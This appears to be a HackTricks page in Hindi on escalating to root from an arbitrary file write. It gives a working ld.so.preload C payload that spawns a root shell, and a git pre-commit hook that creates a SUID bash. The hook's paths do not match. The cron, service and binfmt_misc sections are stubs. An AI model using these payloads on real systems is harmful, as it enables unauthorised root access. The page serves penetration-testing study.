# रूट पर मनमाने फ़ाइल लेखन

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

यह फ़ाइल **`LD_PRELOAD`** पर्यावरण चर की तरह व्यवहार करती है लेकिन यह **SUID बाइनरीज़** में भी काम करती है।\
यदि आप इसे बना सकते हैं या संशोधित कर सकते हैं, तो आप बस एक **पथ जोड़ सकते हैं एक पुस्तकालय का जो प्रत्येक निष्पादित बाइनरी के साथ लोड होगा**।

उदाहरण: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) वे **स्क्रिप्ट** हैं जो एक git रिपॉजिटरी में विभिन्न **इवेंट्स** पर **चलती** हैं जैसे कि जब एक कमिट बनाया जाता है, एक मर्ज... तो यदि एक **विशिष्ट स्क्रिप्ट या उपयोगकर्ता** ये क्रियाएँ बार-बार कर रहा है और यदि **`.git` फोल्डर** में **लिखना संभव** है, तो इसका उपयोग **privesc** के लिए किया जा सकता है।

उदाहरण के लिए, एक git रिपॉजिटरी में **`.git/hooks`** में एक **स्क्रिप्ट** उत्पन्न करना संभव है ताकि यह हमेशा नए कमिट के बनने पर चल सके:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

TODO

### Service & Socket files

TODO

### binfmt_misc

फाइल `/proc/sys/fs/binfmt_misc` में यह संकेत दिया गया है कि कौन सा बाइनरी किस प्रकार की फाइलों को निष्पादित करना चाहिए। TODO: एक सामान्य फाइल प्रकार खुलने पर रिवर्स शेल निष्पादित करने के लिए इसका दुरुपयोग करने की आवश्यकताओं की जांच करें।

{{#include ../../banners/hacktricks-training.md}}
